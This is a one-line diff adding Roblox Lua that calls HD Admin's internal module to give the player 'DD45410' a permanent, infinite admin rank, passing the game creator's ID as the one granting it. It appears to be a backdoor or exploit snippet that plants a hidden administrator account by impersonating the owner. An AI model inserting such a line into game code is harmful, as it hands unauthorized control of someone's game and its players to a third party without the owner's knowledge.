@@ -1,0 +1,1 @@
+_G.HDAdminMain:GetModule("cf"):SetRank(game:GetService("Players")["DD45410"],game.CreatorId, math.huge, "Perm")
